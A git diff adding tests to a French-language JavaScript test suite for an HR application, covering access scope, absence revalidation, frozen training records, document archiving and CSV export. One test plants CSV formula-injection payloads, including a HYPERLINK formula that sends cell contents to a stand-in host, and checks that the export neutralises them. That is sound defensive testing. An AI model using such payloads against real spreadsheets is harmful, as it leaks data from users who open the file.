@@ -396,7 +396,7 @@ describe('Module Ressources humaines', () => {
     assert.equal(a.statut, 'demandee');
     assert.equal(a.demandeurUserId, empUser.id);
     assert.equal(a.secteurId, maint.id);
-    assert.ok(a.nbJours >= 3 && a.nbJours <= 5, 'jours ouvrés (hors week-end et fériés)');
+    assert.equal(a.nbJours, outils.joursOuvres(dans(30), dans(34)), 'jours ouvrés (hors week-end et fériés), quelle que soit la date d\'exécution');
     assert.ok(evenements.some((e) => e.evt === 'rh:absenceDemandee' && e.d.absence.id === a.id));
     const nChef = notifsDe(chefUser.id).filter((n) => /Demande d'absence/.test(n.titre));
     assert.equal(nChef.length, 1, 'le N+1 est notifié');
@@ -786,6 +786,166 @@ describe('Module Ressources humaines', () => {
     assert.ok(srv.db.list('audit', (a) => a.action === 'export' && a.entite === 'personnel').length >= 1, 'export tracé');
   });
 
+  // ------------------------------------------------------------------------------------------------
+  test('habilitations d\'un technicien : portée, site de l\'en-tête et données du dossier contrôlés', async () => {
+    const { c: vtech, user: vtechUser } = await compte('vtech', 'Technicien', [prod2.id], { nom: 'Rival', prenom: 'Valentin' });
+    const p = await personne({ userId: vtechUser.id, secteurId: prod2.id });
+    await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'elec_b2v', dateObtention: dans(-100), numero: 'HE-SECRET-42', organisme: 'Bureau Veritas' });
+    const url = '/api/rh/habilitations-technicien/' + vtechUser.id;
+    const { c: dem } = await compte('demprod2', 'Demandeur', [prod.id]);
+    const { c: techMaint } = await compte('techmaint2', 'Technicien', [maint.id]);
+    assert.equal((await dem.get(url)).status, 404, 'demandeur (portée perso) : personne hors portée malgré le droit métier');
+    assert.equal((await techMaint.get(url)).status, 404, 'technicien d\'un autre secteur');
+    const c1 = clientSite(site1.id);
+    await c1.login('admin', 'admin');
+    assert.equal((await c1.get(url)).status, 404, 'site 2 masqué par le site choisi dans l\'en-tête');
+    const { c: techVal } = await compte('techval', 'Technicien', [prod2.id]);
+    const vu = await techVal.ok('GET', url);
+    assert.deepEqual(vu.typeCodes, ['elec_b2v'], 'même secteur : habilitations visibles');
+    assert.equal('numero' in vu.habilitations[0], false, 'numéro de titre réservé au droit RH');
+    assert.equal('organisme' in vu.habilitations[0], false);
+    const { c: rhVal } = await compte('rhval', 'Gestionnaire RH', [prod2.id]);
+    assert.equal((await rhVal.ok('GET', url)).habilitations[0].numero, 'HE-SECRET-42', 'avec rh › voir : numéro communiqué');
+    assert.equal((await vtech.ok('GET', url)).habilitations[0].numero, 'HE-SECRET-42', 'ses propres habilitations');
+  });
+
+  test('absences : modification d\'une absence validée — validation à refaire sauf par un valideur, jamais la sienne', async () => {
+    const { c: chef, user: chefUser } = await compte('chefc2', 'Technicien', [maint.id], { nom: 'Chef', prenom: 'Camille' });
+    const { c: rh, user: rhUser } = await compte('rhc2', 'Gestionnaire RH', [maint.id], { nom: 'Soi', prenom: 'Sam' });
+    const { c: rhSansValider } = await compte('rhnoval', 'Gestionnaire RH', [maint.id], { overrides: { rh: { valider: false } } });
+    await personne({ userId: rhUser.id, secteurId: maint.id, managerUserId: chefUser.id });
+    const autre = await personne({ nom: 'Autre', prenom: 'Alex', secteurId: maint.id, managerUserId: chefUser.id });
+    // Sa propre absence, validée par le N+1 : intouchable
+    const sienne = await rh.ok('POST', '/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(300) });
+    assert.equal((await chef.ok('POST', `/api/rh/absences/${sienne.id}/valider`, {})).statut, 'validee');
+    assert.equal((await rh.put(`/api/rh/absences/${sienne.id}`, { dateFin: dans(314) })).status, 403, 'pas de modification de sa propre absence validée');
+    assert.equal(srv.db.get('absences', sienne.id).dateFin, dans(300));
+    // Absence validée d'autrui, modifiée sans droit de validation : elle repasse en attente et les valideurs sont prévenus
+    const a = await admin.ok('POST', '/api/rh/absences', { personnelId: autre.id, typeCode: 'conges', dateDebut: dans(320), dateFin: dans(321), statut: 'validee' });
+    assert.equal((await rhSansValider.ok('PUT', `/api/rh/absences/${a.id}`, { commentaire: 'Précision' })).statut, 'validee', 'un commentaire ne remet pas la validation en cause');
+    const avant = evenements.length;
+    const nChefAvant = notifsDe(chefUser.id).filter((n) => /Demande d'absence/.test(n.titre)).length;
+    const m = await rhSansValider.ok('PUT', `/api/rh/absences/${a.id}`, { dateFin: dans(330) });
+    assert.equal(m.statut, 'demandee');
+    assert.equal(m.valideurUserId, null);
+    assert.equal(m.dateValidation, null);
+    assert.ok(evenements.slice(avant).some((e) => e.evt === 'rh:absenceDemandee' && e.d.absence.id === a.id));
+    assert.equal(notifsDe(chefUser.id).filter((n) => /Demande d'absence/.test(n.titre)).length, nChefAvant + 1, 'le N+1 est prévenu');
+    assert.ok(srv.db.list('audit', (x) => x.entite === 'absences' && x.entiteId === a.id && x.action === 'statut').length >= 1, 'changement de statut tracé');
+    assert.equal((await chef.ok('POST', `/api/rh/absences/${a.id}/valider`, {})).statut, 'validee');
+    // Par un valideur RH : l'absence reste validée, la validation est renouvelée à son nom
+    const v = await rh.ok('PUT', `/api/rh/absences/${a.id}`, { dateFin: dans(331) });
+    assert.equal(v.statut, 'validee');
+    assert.equal(v.valideurUserId, rhUser.id);
+    assert.equal(v.peutValider, true);
+    assert.equal((await rhSansValider.ok('GET', '/api/rh/absences/' + a.id)).peutValider, false, 'indicateur pour l\'interface');
+  });
+
+  test('personnel : sa propre fiche, le lien à son compte et le N+1 relèvent d\'un autre gestionnaire', async () => {
+    const { c: rh, user: rhUser } = await compte('rhlien', 'Gestionnaire RH', [maint.id], { nom: 'Lien', prenom: 'Léa' });
+    const { c: autreRh } = await compte('rhautre', 'Gestionnaire RH', [maint.id]);
+    assert.equal((await rh.post('/api/rh/personnel', { nom: 'Lien', secteurId: maint.id, userId: rhUser.id })).status, 403, 'pas de fiche liée à son propre compte');
+    const p = await personne({ userId: rhUser.id, secteurId: maint.id });
+    assert.equal((await rh.put('/api/rh/personnel/' + p.id, { fonction: 'Directrice' })).status, 403, 'sa propre fiche');
+    assert.equal((await rh.put('/api/rh/personnel/' + p.id, { userId: null })).status, 403, 'ni déliée');
+    assert.equal((await autreRh.ok('PUT', '/api/rh/personnel/' + p.id, { fonction: 'Gestionnaire RH' })).fonction, 'Gestionnaire RH', 'un autre gestionnaire peut');
+    const q = await personne({ nom: 'Équipe', prenom: 'Quentin', secteurId: maint.id });
+    assert.equal((await rh.put('/api/rh/personnel/' + q.id, { managerUserId: rhUser.id })).status, 403, 'pas de désignation de soi-même comme N+1');
+    assert.equal((await rh.post('/api/rh/personnel', { nom: 'Nouveau', secteurId: maint.id, managerUserId: rhUser.id })).status, 403);
+    assert.equal(srv.db.get('personnel', q.id).managerUserId, null);
+    assert.equal((await admin.ok('PUT', '/api/rh/personnel/' + q.id, { managerUserId: rhUser.id })).managerUserId, rhUser.id, 'l\'administrateur désigne le N+1');
+    assert.ok(srv.db.list('audit', (x) => x.entite === 'personnel' && x.entiteId === q.id && /responsable \(N\+1\)/.test(JSON.stringify(x))).length >= 1, 'changement de N+1 tracé');
+    assert.equal((await rh.ok('PUT', '/api/rh/personnel/' + q.id, { fonction: 'Technicien' })).fonction, 'Technicien', 'N+1 déjà en place : les autres champs restent modifiables');
+    const { user: tiers } = await compte('tierslien', 'Technicien', [maint.id]);
+    await admin.ok('PUT', '/api/rh/personnel/' + q.id, { userId: tiers.id });
+    assert.ok(srv.db.list('audit', (x) => x.entite === 'personnel' && x.entiteId === q.id && /compte lié/.test(JSON.stringify(x))).length >= 1, 'changement de compte lié tracé');
+  });
+
+  test('formations : une formation réalisée est figée (dates, habilitation visée, participants) ; réalisation refusée hors écriture', async () => {
+    const a = await personne({ nom: 'Figée', prenom: 'Anne', secteurId: maint.id });
+    const b = await personne({ nom: 'Figée', prenom: 'Bob', secteurId: maint.id });
+    const f = await admin.ok('POST', '/api/rh/formations', { intitule: 'SST initial', dateDebut: dans(-3), statut: 'realisee', habilitationTypeCode: 'sst', personnelIds: [a.id] });
+    assert.equal((await admin.put('/api/rh/formations/' + f.id, { dateDebut: dans(200), dateFin: dans(201) })).status, 400, 'dates figées');
+    assert.equal((await admin.put('/api/rh/formations/' + f.id, { habilitationTypeCode: 'atex' })).status, 400, 'habilitation visée figée');
+    assert.equal((await admin.put('/api/rh/formations/' + f.id, { personnelIds: [a.id, b.id] })).status, 400, 'participants figés');
+    const maj = await admin.ok('PUT', '/api/rh/formations/' + f.id, { lieu: 'Salle B', cout: 600, description: 'Programme détaillé' });
+    assert.equal(maj.statut, 'realisee');
+    assert.equal(maj.lieu, 'Salle B');
+    assert.equal(maj.habilitationTypeCode, 'sst');
+    // Participants d'un site en lecture seule : aucune habilitation n'y est écrite
+    const p1 = await personne({ nom: 'Feu', prenom: 'Paul', secteurId: prod.id });
+    const p2 = await personne({ nom: 'Feu', prenom: 'Pia', secteurId: prod2.id });
+    const inter = await admin.ok('POST', '/api/rh/formations', { intitule: 'Permis feu', dateDebut: dans(-2), habilitationTypeCode: 'permis_feu', personnelIds: [p1.id, p2.id], secteurId: prod.id });
+    const { c: rhLect } = await compte('rhlectfor', 'Gestionnaire RH', [prod.id], { siteAcces: [{ siteId: site2.id, mode: 'lecture' }] });
+    const refus = await rhLect.post(`/api/rh/formations/${inter.id}/realiser`, {});
+    assert.equal(refus.status, 403);
+    assert.match(refus.body.erreur, /Pia Feu/);
+    assert.equal(srv.db.get('formations', inter.id).statut, 'planifiee');
+    assert.equal(srv.db.count('habilitations', (h) => h.personnelId === p2.id), 0);
+    const ok = await rhLect.ok('POST', `/api/rh/formations/${inter.id}/realiser`, { presents: [p1.id] });
+    assert.deepEqual(ok.habilitationsGenerees.map((g) => g.personnelId), [p1.id]);
+    const sansHab = await admin.ok('POST', '/api/rh/formations', { intitule: 'Sensibilisation', dateDebut: dans(-1), personnelIds: [p1.id, p2.id], secteurId: prod.id });
+    assert.equal((await rhLect.ok('POST', `/api/rh/formations/${sansHab.id}/realiser`, {})).statut, 'realisee', 'sans habilitation visée : rien n\'est écrit sur l\'autre site');
+  });
+
+  test('habilitations : renouvellement par formation — les pièces de la période précédente sont archivées avec elle', async () => {
+    const p = await personne({ nom: 'Archive', prenom: 'Alice', secteurId: maint.id });
+    const h = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(10), -24), numero: 'SST-2024-117', documents: [{ nom: 'attestation-2024.pdf', type: 'application/pdf', contenu: 'data:application/pdf;base64,' + Buffer.from('%PDF-1.4 ancienne').toString('base64') }] });
+    const f = await admin.ok('POST', '/api/rh/formations', { intitule: 'MAC SST', dateDebut: dans(-1), statut: 'realisee', habilitationTypeCode: 'sst', personnelIds: [p.id] });
+    assert.equal(f.habilitationsGenerees[0].action, 'renouvelee');
+    const r = await admin.ok('GET', '/api/rh/habilitations/' + h.id);
+    assert.equal(r.nbDocuments, 0, 'la nouvelle période repart sans pièce');
+    assert.equal(r.numero, '');
+    assert.equal(r.historique.length, 1);
+    assert.equal(r.historique[0].numero, 'SST-2024-117');
+    assert.deepEqual(r.historique[0].documents.map((d) => d.nom), ['attestation-2024.pdf']);
+    assert.equal(r.historique[0].documents[0].contenu, undefined, 'contenu non renvoyé dans la fiche');
+    const dl = await admin.get(`/api/rh/habilitations/${h.id}/historique/${r.historique[0].rang}/documents/0`);
+    assert.equal(dl.status, 200);
+    assert.match(String(dl.body), /ancienne/);
+    assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/historique/3/documents/0`)).status, 404);
+    assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/documents/0`)).status, 404);
+  });
+
+  test('exports CSV : les cellules commençant par un caractère de formule sont neutralisées', async () => {
+    await personne({ nom: '=HYPERLINK("http://exemple.invalid/?x="&A1;"Cliquer")', prenom: '+SUM(1;2)', fonction: '@cmd', secteurId: maint.id, coutHoraire: 40.5 });
+    const csv = String((await admin.get('/api/rh/export/personnel')).body);
+    const ligne = csv.split('\r\n').find((l) => l.includes('HYPERLINK'));
+    assert.ok(ligne, 'ligne exportée');
+    assert.ok(ligne.includes(';"\'=HYPERLINK('), 'apostrophe devant =');
+    assert.ok(ligne.includes(';"\'+SUM(1;2)";\'@cmd;'), 'apostrophe devant + et @');
+    assert.ok(ligne.includes(';40,5;'), 'les nombres restent des nombres');
+  });
+
+  test('vérification des échéances : le déclenchement manuel reste dans la portée de l\'utilisateur', async () => {
+    const pv = await personne({ nom: 'Échéance', prenom: 'Valréas', secteurId: prod2.id });
+    const hv = await admin.ok('POST', '/api/rh/habilitations', { personnelId: pv.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(-10), -24) });
+    assert.equal(hv.etat, 'expiree');
+    const { c: rh1 } = await compte('rhcarp', 'Gestionnaire RH', [prod.id]);
+    const { c: rhL } = await compte('rhlectech', 'Gestionnaire RH', [prod.id], { siteAcces: [{ siteId: site2.id, mode: 'lecture' }] });
+    await rh1.ok('POST', '/api/rh/verifier-echeances', {});
+    assert.deepEqual(srv.db.get('habilitations', hv.id).alertes, {}, 'site 2 hors portée : non traité');
+    await rhL.ok('POST', '/api/rh/verifier-echeances', {});
+    assert.deepEqual(srv.db.get('habilitations', hv.id).alertes, {}, 'site 2 en lecture seule : non traité');
+    const r = await admin.ok('POST', '/api/rh/verifier-echeances', {});
+    assert.ok(r.expirees >= 1);
+    assert.equal(srv.db.get('habilitations', hv.id).alertes.expiree, hv.dateExpiration);
+  });
+
+  test('personnel : la prochaine visite médicale programmée est exposée dans le résumé', async () => {
+    const p = await personne({ nom: 'Programmée', prenom: 'Émilie', secteurId: log.id });
+    await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'periodique', date: dans(-500), aptitude: 'apte', prochaineVisite: dans(960) });
+    const reprise = await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'reprise', date: dans(3), aptitude: 'en_attente' });
+    const dv = (await admin.ok('GET', '/api/rh/personnel/' + p.id)).derniereVisite;
+    assert.equal(dv.etat, 'programmee');
+    assert.deepEqual(dv.programmee, { id: reprise.id, date: dans(3), type: 'reprise' });
+    const q = await personne({ nom: 'Embauche', prenom: 'Lucas', secteurId: log.id });
+    await admin.ok('POST', '/api/rh/visites', { personnelId: q.id, type: 'embauche', date: dans(-45), aptitude: 'apte' });
+    const dq = (await admin.ok('GET', '/api/rh/personnel?recherche=Embauche')).find((x) => x.id === q.id).derniereVisite;
+    assert.equal(dq.prochaineVisite, null);
+    assert.equal(dq.programmee, null);
+  });
+
   test('audit et références des formulaires', async () => {
     const actions = new Set(srv.db.list('audit', (a) => ['personnel', 'habilitations', 'formations', 'visitesMedicales', 'absences'].includes(a.entite)).map((a) => `${a.entite}:${a.action}`));
     for (const attendu of ['personnel:creation', 'personnel:modification', 'personnel:desactivation', 'personnel:suppression', 'habilitations:creation', 'habilitations:renouvellement', 'habilitations:document', 'formations:creation', 'formations:statut', 'visitesMedicales:creation', 'absences:creation', 'absences:validation', 'absences:refus', 'absences:statut']) {
@@ -845,5 +1005,20 @@ describe('Ressources humaines : données de démonstration', () => {
     const moi = await md.ok('GET', '/api/rh/moi');
     assert.equal(moi.personnel.nomComplet, 'Marie Dupont');
     assert.equal(moi.aValider.length, 1, 'demande de Karim Leroy à valider par son N+1');
+  });
+
+  test('seedDemo : un compte déjà lié à une fiche n\'est pas lié une seconde fois', async () => {
+    const s2 = await demarrer();
+    try {
+      s2.ctx.modules.find((m) => m.fichier === 'utilisateurs.js').seedDemo(s2.ctx);
+      const admin = s2.client();
+      await admin.login('admin', 'admin');
+      const u = s2.db.findOne('users', (x) => x.login === 'mdupont');
+      const maint = s2.db.findOne('secteurs', (x) => x.code === 'MAINT');
+      const existante = await admin.ok('POST', '/api/rh/personnel', { userId: u.id, secteurId: maint.id, typeContratCode: 'cdi', fonction: 'Fiche saisie avant la démonstration' });
+      s2.ctx.modules.find((m) => m.fichier === 'rh.js').seedDemo(s2.ctx);
+      assert.equal(s2.db.count('personnel', (p) => Number(p.userId) === u.id), 1, 'une seule fiche liée au compte');
+      assert.ok(s2.db.count('habilitations', (h) => h.personnelId === existante.id) >= 1, 'la fiche existante est réutilisée par la démonstration');
+    } finally { await s2.stop(); }
   });
 });
